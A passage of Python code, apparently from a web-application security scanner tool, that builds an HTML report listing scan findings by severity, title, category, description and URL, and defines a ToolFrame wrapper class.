        .finding-critical {{ border-left-color: #d32f2f; }}
        .finding-high {{ border-left-color: #f57c00; }}
        .finding-medium {{ border-left-color: #fbc02d; }}
        .finding-low {{ border-left-color: #388e3c; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Web Application Security Scan Report</h1>
        <p><strong>Target URL:</strong> {self.url_entry.get()}</p>
        <p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><strong>Total Issues:</strong> {len(self.scan_results)}</p>
    </div>
    
    <div class="summary">
        <h2>Summary</h2>
        <ul>
"""
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            count = summary_data['by_severity'].get(severity, 0)
            if count > 0:
                html += f'            <li class="severity-{severity.lower()}">{severity}: {count}</li>\n'
        
        html += """        </ul>
    </div>
    
    <div class="findings">
        <h2>Detailed Findings</h2>
"""
        
        for finding in self.scan_results:
            severity_class = f"finding-{finding['severity'].lower()}"
            html += f"""        <div class="finding {severity_class}">
            <h3>{finding['title']} <span class="severity-{finding['severity'].lower()}">({finding['severity']})</span></h3>
            <p><strong>Category:</strong> {finding['category'].replace('_', ' ').title()}</p>
            <p><strong>Description:</strong> {finding['description']}</p>
            <p><strong>URL:</strong> {finding['url']}</p>
        </div>
"""
        
        html += """    </div>
</body>
</html>"""
        
        return html


# Create the ToolFrame class that the main application expects
class ToolFrame(WebAppSecurityScanner):
    """Wrapper class for main application compatibility"""
    pass